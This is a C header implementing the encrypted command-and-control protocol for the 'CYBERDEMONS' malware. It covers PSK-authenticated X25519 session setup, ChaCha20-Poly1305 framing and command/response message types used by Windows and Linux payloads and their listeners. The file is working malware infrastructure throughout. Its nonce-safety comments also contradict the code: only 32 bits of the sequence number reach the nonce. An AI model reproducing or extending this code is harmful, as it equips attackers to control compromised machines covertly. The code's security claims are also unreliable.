/*
 * cybproto.h — CYBERDEMONS C2 wire protocol "CYB3"
 * ---------------------------------------------------------------------------
 * Replaces the v2 XOR(0x3A)+hex scheme.  Transport-agnostic: the caller feeds
 * bytes in with cyb_feed() and pulls authenticated messages out with
 * cyb_recv_next().  Both the Windows (pay.cpp) and Linux (pay_linux.c) payloads
 * and the Python listeners speak this.
 *
 * Wire format
 * -----------
 *   off  size  field
 *     0     2  magic        0xCB 0x03
 *     2     1  type
 *     3     1  flags        (reserved, must be 0)
 *     4     4  seq          big-endian, per-direction monotonic
 *     8     4  ct_len       big-endian, ciphertext length
 *    12    12  nonce        4-byte session prefix || 8-byte BE counter
 *    24     N  ciphertext   ChaCha20-Poly1305, N == pt_len
 *  24+N    16  tag
 *
 *   Header is 24 bytes.  AAD = the first 12 bytes (magic..ct_len), so type,
 *   seq and length are all authenticated and cannot be tampered with.
 *
 * Session establishment (PSK + ephemeral X25519, a la Noise IK)
 * ------------------------------------------------------------
 *   k_auth = HMAC-SHA256(psk, "CYBERDEMONS-C2-v3-hello")
 *
 *   C->S  HELLO     client_pub[32] || client_nonce[16] || tag16
 *                   tag = HMAC(k_auth, "H" || client_pub || client_nonce)
 *                   Unencrypted but authenticated: the server checks the PSK
 *                   proof *before* spending a scalar multiplication, and an
 *                   unauthenticated peer cannot drive the server into a DH.
 *
 *   S->C  HELLOACK  server_pub[32] || server_nonce[16] || tag16
 *                   tag = HMAC(k_auth, "A" || server_pub || server_nonce
 *                                     || client_pub || client_nonce)
 *                   Binding the client values in stops a captured HELLOACK from
 *                   being replayed into a different session.
 *
 *   shared = X25519(own_priv, peer_pub)
 *   session = HKDF-SHA256(ikm = psk || shared,
 *                         salt = client_nonce || server_nonce,
 *                         info = "CYBERDEMONS-C2-v3 session", 32)
 *   master  = HKDF-SHA256(ikm = session, info = "cyb3 keys", 72)
 *              master[0..32)  k_c2s   (client -> server)
 *              master[32..64) k_s2c   (server -> client)
 *              master[64..68) nonce prefix for c2s
 *              master[68..72) nonce prefix for s2c
 *
 *   Forward secrecy: the session key mixes in an ephemeral DH, so later
 *   compromise of the PSK does not decrypt previously recorded traffic.
 *   Direction separation: c2s and s2c keys differ, so a captured frame cannot
 *   be reflected back at its sender.
 *
 * Nonce safety
 * ------------
 *   The 4-byte random prefix is per-session and the 8-byte counter is
 *   strictly increasing, so a nonce repeats only after 2^64 frames in one
 *   direction -- which cyb_seal() refuses rather than allowing.
 */

#ifndef CYB_PROTO_H
#define CYB_PROTO_H

#include "cybcrypt.h"
#include <stdlib.h>

#define CYB_MAGIC0        0xCB
#define CYB_MAGIC1        0x03
#define CYB_VERSION       3

#define CYB_HDR_LEN       24
#define CYB_AAD_LEN       12
#define CYB_MAX_PLAINTEXT (16u * 1024u * 1024u)   /* 16 MB */

/* frame types */
#define CYB_T_HELLO       0x01
#define CYB_T_HELLOACK    0x02
#define CYB_T_CMD         0x10
#define CYB_T_RESP        0x11
#define CYB_T_PING        0x20
#define CYB_T_PONG        0x21
#define CYB_T_BYE         0x30
#define CYB_T_ERR         0x7F

/* hello payload sizes */
#define CYB_PUB_LEN       32
#define CYB_NONCE16_LEN   16
#define CYB_HELLO_BODY    (CYB_PUB_LEN + CYB_NONCE16_LEN)          /* 48 */
#define CYB_HELLO_FRAME   (CYB_HELLO_BODY + CYB_TAG_LEN)            /* 64 */

#define CYB_LABEL_AUTH    "CYBERDEMONS-C2-v3-hello"
#define CYB_LABEL_SESSION "CYBERDEMONS-C2-v3 session"
#define CYB_LABEL_KEYS    "cyb3 keys"

/* ------------------------------------------------------------------ */
/* session state                                                       */
/* ------------------------------------------------------------------ */

typedef struct {
    uint8_t  k_send[32];
    uint8_t  k_recv[32];
    uint8_t  n_send[4];
    uint8_t  n_recv[4];
    uint64_t tx_seq;
    uint64_t rx_next;          /* next acceptable inbound sequence */
    int      established;

    /* reassembly buffer for inbound bytes */
    uint8_t *rx;
    size_t   rx_len;      /* bytes of valid data in rx */
    size_t   rx_off;      /* offset of the next unparsed frame */
    size_t   rx_cap;
} cyb_session;

CYB_INLINE void cyb_session_init(cyb_session *s)
{
    memset(s, 0, sizeof(*s));
}

CYB_INLINE void cyb_session_free(cyb_session *s)
{
    if (s->rx) { cyb_secure_zero(s->rx, s->rx_cap); free(s->rx); s->rx = NULL; }
    cyb_secure_zero(s->k_send, sizeof(s->k_send));
    cyb_secure_zero(s->k_recv, sizeof(s->k_recv));
    cyb_secure_zero(s, sizeof(*s));
}

/* ------------------------------------------------------------------ */
/* key derivation                                                      */
/* ------------------------------------------------------------------ */

CYB_INLINE void cyb_derive_auth_key(uint8_t out[32], const uint8_t psk[32])
{
    cyb_hmac_sha256(psk, 32, (const uint8_t *)CYB_LABEL_AUTH,
                    sizeof(CYB_LABEL_AUTH) - 1, out);
}

/*
 * Both sides run this once they hold the peer public key and both nonces.
 *
 * The outputs are always in canonical direction order (c2s first) regardless
 * of which side is calling, so the two peers derive byte-identical values and
 * each one just assigns them to its own send/recv slots.  `role` is accepted
 * only so call sites read naturally; it does not reorder anything.
 */
CYB_INLINE void cyb_derive_session(uint8_t k_c2s[32], uint8_t k_s2c[32],
                                   uint8_t pfx_c2s[4], uint8_t pfx_s2c[4],
                                   const uint8_t psk[32],
                                   const uint8_t priv[32], const uint8_t peer_pub[32],
                                   const uint8_t c_nonce[16], const uint8_t s_nonce[16],
                                   int role)
{
    uint8_t shared[32], ikm[64], salt[32], session[32], master[72];

    (void)role;
    cyb_x25519(shared, priv, peer_pub);

    /* An all-zero shared secret means a low-order or all-zero peer key was
     * supplied.  Refuse it: continuing would silently derive a public key. */
    {
        uint8_t zero[32];
        memset(zero, 0, sizeof(zero));
        if (cyb_ct_memcmp(shared, zero, 32) == 0) {
            memset(k_c2s, 0, 32); memset(k_s2c, 0, 32);
            memset(pfx_c2s, 0, 4); memset(pfx_s2c, 0, 4);
            goto done;
        }
    }

    memcpy(ikm, psk, 32);
    memcpy(ikm + 32, shared, 32);
    memcpy(salt, c_nonce, 16);
    memcpy(salt + 16, s_nonce, 16);

    cyb_hkdf(session, 32, salt, 32, ikm, 64,
             (const uint8_t *)CYB_LABEL_SESSION, sizeof(CYB_LABEL_SESSION) - 1);
    cyb_hkdf(master, 72, NULL, 0, session, 32,
             (const uint8_t *)CYB_LABEL_KEYS, sizeof(CYB_LABEL_KEYS) - 1);

    memcpy(k_c2s,  master +  0, 32);
    memcpy(k_s2c,  master + 32, 32);
    memcpy(pfx_c2s, master + 64,  4);
    memcpy(pfx_s2c, master + 68,  4);

done:
    cyb_secure_zero(shared, sizeof(shared));
    cyb_secure_zero(ikm, sizeof(ikm));
    cyb_secure_zero(salt, sizeof(salt));
    cyb_secure_zero(session, sizeof(session));
    cyb_secure_zero(master, sizeof(master));
}

/* ------------------------------------------------------------------ */
/* hello / helloack  (plaintext frames, PSK-authenticated)              */
/* ------------------------------------------------------------------ */

/*
 * Write the 12-byte authenticated header prefix.  The trailing 12 bytes of
 * the 24-byte header are the nonce, which the caller always overwrites; we
 * zero them here so a plain-text hello frame can never put uninitialised heap
 * bytes on the wire.  (cyb_seal() writes the real nonce immediately after.)
 */
CYB_INLINE void cyb_write_hdr(uint8_t *h, uint8_t type, uint64_t seq, uint32_t ctlen)
{
    h[0] = CYB_MAGIC0;
    h[1] = CYB_MAGIC1;
    h[2] = type;
    h[3] = 0;
    cyb_hton32(h + 4, (uint32_t)(seq & 0xFFFFFFFFu));
    cyb_hton32(h + 8, ctlen);
    memset(h + 12, 0, 12);
}

/*
 * Build a HELLO (client) or HELLOACK (server) frame.
 *
 * `is_ack` selects the message kind, which fixes both the domain-separation
 * label and whether the peer values join the transcript:
 *   is_ack = 0  HELLO     label 'H', transcript = pub || nonce
 *   is_ack = 1  HELLOACK  label 'A', transcript = pub || nonce || peer_pub || peer_nonce
 * Binding the client values into the ACK is what stops a captured HELLOACK
 * from being replayed into a different session.
 *
 * Returns the frame length, or 0 if outcap is too small.
 */
CYB_INLINE size_t cyb_build_hello(uint8_t *out, size_t outcap, int is_ack,
                                  const uint8_t auth_key[32],
                                  const uint8_t own_pub[32], const uint8_t own_nonce[16],
                                  const uint8_t peer_pub[32], const uint8_t peer_nonce[16])
{
    uint8_t mac[32], *p;
    size_t  need = CYB_HDR_LEN + CYB_HELLO_FRAME;

    if (outcap < need) return 0;

    p = out + CYB_HDR_LEN;
    memcpy(p, own_pub, CYB_PUB_LEN);
    memcpy(p + CYB_PUB_LEN, own_nonce, CYB_NONCE16_LEN);

    {
        uint8_t tr[1 + 32 + 16 + 32 + 16];
        size_t  n = 0;
        tr[n++] = is_ack ? 'A' : 'H';
        memcpy(tr + n, own_pub, CYB_PUB_LEN);       n += CYB_PUB_LEN;
        memcpy(tr + n, own_nonce, CYB_NONCE16_LEN); n += CYB_NONCE16_LEN;
        if (is_ack && peer_pub && peer_nonce) {
            memcpy(tr + n, peer_pub, CYB_PUB_LEN);     n += CYB_PUB_LEN;
            memcpy(tr + n, peer_nonce, CYB_NONCE16_LEN); n += CYB_NONCE16_LEN;
        }
        cyb_hmac_sha256(auth_key, 32, tr, n, mac);
    }
    memcpy(p + CYB_HELLO_BODY, mac, CYB_TAG_LEN);

    cyb_write_hdr(out, is_ack ? CYB_T_HELLOACK : CYB_T_HELLO, 0, (uint32_t)CYB_HELLO_FRAME);
    cyb_secure_zero(mac, sizeof(mac));
    return need;
}

/*
 * Verify a HELLO/HELLOACK body and hand back the values it carried.
 *
 * The MAC is computed over the public key and nonce *read out of the body*,
 * not over caller-supplied copies.  That matters: if the caller passed its own
 * idea of the peer's key, a tampered key in the frame would never be examined
 * and a forged frame could be accepted.
 *
 *   is_ack     0 for HELLO, 1 for HELLOACK (fixes the label and whether the
 *              peer values join the transcript)
 *   peer_*     the other side's pub/nonce, required when is_ack != 0
 *   out_pub / out_nonce  may be NULL if the caller does not need them
 *
 * Returns 0 on success, -1 on failure.
 */
CYB_INLINE int cyb_verify_hello(const uint8_t *body, size_t bodylen, int is_ack,
                                const uint8_t auth_key[32],
                                const uint8_t peer_pub[32], const uint8_t peer_nonce[16],
                                uint8_t *out_pub, uint8_t *out_nonce)
{
    uint8_t mac[32];
    uint8_t tr[1 + 32 + 16 + 32 + 16];
    size_t  n = 0;
    int     bad;

    if (bodylen != CYB_HELLO_FRAME) return -1;
    if (is_ack && (!peer_pub || !peer_nonce)) return -1;

    tr[n++] = is_ack ? 'A' : 'H';
    memcpy(tr + n, body, CYB_PUB_LEN);            n += CYB_PUB_LEN;
    memcpy(tr + n, body + CYB_PUB_LEN, CYB_NONCE16_LEN); n += CYB_NONCE16_LEN;
    if (is_ack) {
        memcpy(tr + n, peer_pub, CYB_PUB_LEN);     n += CYB_PUB_LEN;
        memcpy(tr + n, peer_nonce, CYB_NONCE16_LEN); n += CYB_NONCE16_LEN;
    }
    cyb_hmac_sha256(auth_key, 32, tr, n, mac);
    bad = cyb_ct_memcmp(mac, body + CYB_HELLO_BODY, CYB_TAG_LEN);
    cyb_secure_zero(mac, sizeof(mac));
    cyb_secure_zero(tr, sizeof(tr));
    if (bad) return -1;

    if (out_pub)   memcpy(out_pub,   body, CYB_PUB_LEN);
    if (out_nonce) memcpy(out_nonce, body + CYB_PUB_LEN, CYB_NONCE16_LEN);
    return 0;
}

/* ------------------------------------------------------------------ */
/* encrypted framing                                                   */
/* ------------------------------------------------------------------ */

/*
 * Seal one message.  `out` needs CYB_HDR_LEN + ptlen + CYB_TAG_LEN bytes.
 * Returns the frame length, or 0 if ptlen is out of range or the tx counter
 * has wrapped (which we refuse rather than risk a nonce reuse).
 */
CYB_INLINE size_t cyb_seal(cyb_session *s, uint8_t type,
                           const uint8_t *pt, size_t ptlen, uint8_t *out)
{
    uint8_t  nonce[CYB_NONCE_LEN];
    uint8_t *ct = out + CYB_HDR_LEN;
    size_t   total;

    if (!s->established) return 0;
    if (ptlen > CYB_MAX_PLAINTEXT) return 0;
    if (s->tx_seq == 0xFFFFFFFFFFFFFFFFULL) return 0;   /* refuse to wrap */

    total = CYB_HDR_LEN + ptlen + CYB_TAG_LEN;

    memcpy(nonce, s->n_send, 4);
    cyb_hton32(nonce + 4, 0);
    cyb_hton32(nonce + 8, (uint32_t)(s->tx_seq & 0xFFFFFFFFu));

    cyb_write_hdr(out, type, s->tx_seq, (uint32_t)ptlen);
    memcpy(out + 12, nonce, CYB_NONCE_LEN);      /* nonce travels in the clear; it is not secret */
    if (ptlen) memcpy(ct, pt, ptlen);
    cyb_aead_seal(ct, pt, ptlen, ct + ptlen, s->k_send, nonce, out, CYB_AAD_LEN);
    s->tx_seq++;
    return total;
}

/* ------------------------------------------------------------------ */
/* reassembly                                                          */
/* ------------------------------------------------------------------ */

CYB_INLINE size_t cyb_rx_hard_cap(void)
{
    /* One maximum frame plus the header/tag, so a peer announcing a huge
     * length can never make us allocate more than this. */
    return (size_t)CYB_HDR_LEN + CYB_MAX_PLAINTEXT + CYB_TAG_LEN;
}

CYB_INLINE void cyb_rx_compact(cyb_session *s)
{
    if (s->rx_off == 0) return;
    if (s->rx_len > s->rx_off)
        memmove(s->rx, s->rx + s->rx_off, s->rx_len - s->rx_off);
    s->rx_len -= s->rx_off;
    s->rx_off = 0;
}

/* Returns 0 on success, -1 if the buffer cannot grow or the cap is exceeded. */
CYB_INLINE int cyb_feed(cyb_session *s, const uint8_t *data, size_t n)
{
    size_t hard = cyb_rx_hard_cap();
    size_t need;

    if (s->rx_off) {
        /* Reclaim consumed frames before deciding we need more room. */
        if (s->rx_off >= s->rx_len) {
            s->rx_len = 0;
            s->rx_off = 0;
        } else if (s->rx_off >= 4096) {
            cyb_rx_compact(s);
        }
    }

    need = s->rx_len + n;
    if (n > hard || need < s->rx_len || need > hard) return -1;

    if (need > s->rx_cap) {
        size_t ncap = s->rx_cap ? s->rx_cap : 8192;
        uint8_t *p;
        while (ncap < need) {
            if (ncap > hard) { ncap = hard; break; }
            ncap *= 2;
        }
        p = (uint8_t *)realloc(s->rx, ncap);
        if (!p) return -1;
        s->rx = p;
        s->rx_cap = ncap;
    }
    memcpy(s->rx + s->rx_len, data, n);
    s->rx_len += n;
    return 0;
}

/*
 * Pop the next authenticated message.
 *
 *   1  -> *type / *pt / *ptlen set.  *pt points into the session's internal
 *        buffer and is valid only until the next cyb_feed()/cyb_recv_next()
 *        call, so copy anything you need to keep.
 *   0  -> need more bytes
 *  -1  -> protocol violation (bad magic/length/replay/auth) -- drop the link
 */
CYB_INLINE int cyb_recv_next(cyb_session *s, uint8_t *type,
                             uint8_t **pt, size_t *ptlen)
{
    const uint8_t *fh;
    uint8_t *base;
    uint32_t seq, ctlen;
    size_t   total, avail;
    uint8_t  want_type;

    avail = s->rx_len - s->rx_off;
    if (avail < CYB_HDR_LEN) return 0;
    base = s->rx + s->rx_off;
    fh   = base;

    if (fh[0] != CYB_MAGIC0 || fh[1] != CYB_MAGIC1) return -1;
    if (fh[3] != 0) return -1;

    want_type = fh[2];
    if (want_type != CYB_T_CMD && want_type != CYB_T_RESP &&
        want_type != CYB_T_PING && want_type != CYB_T_PONG &&
        want_type != CYB_T_BYE  && want_type != CYB_T_ERR)
        return -1;

    seq   = cyb_ntohl32(fh + 4);
    ctlen = cyb_ntohl32(fh + 8);
    if (ctlen > CYB_MAX_PLAINTEXT) return -1;

    total = (size_t)CYB_HDR_LEN + ctlen + CYB_TAG_LEN;
    if (avail < total) return 0;

    /*
     * Strictly increasing per direction.  TCP delivers in order, so nothing
     * legitimate is ever rejected, and this kills replays and frames carried
     * over from a previous connection for free.
     */
    if (seq != s->rx_next) return -1;

    /* The counter embedded in the nonce must match the authenticated seq, and
     * the prefix must be the one this session derived. */
    if (cyb_ntohl32(fh + 16) != 0) return -1;
    if (cyb_ntohl32(fh + 20) != seq) return -1;
    if (cyb_ct_memcmp(s->n_recv, fh + 12, 4) != 0) return -1;

    /* Decrypt in place: the AAD is the header at `base`, the ciphertext starts
     * CYB_HDR_LEN later, so they never overlap. */
    if (cyb_aead_open(base + CYB_HDR_LEN, base + CYB_HDR_LEN, ctlen,
                      base + CYB_HDR_LEN + ctlen,
                      s->k_recv, fh + 12, base, CYB_AAD_LEN) != 0)
        return -1;

    s->rx_next = seq + 1;
    s->rx_off += total;

    *type  = want_type;
    *pt    = base + CYB_HDR_LEN;
    *ptlen = ctlen;
    return 1;
}

#endif /* CYB_PROTO_H */
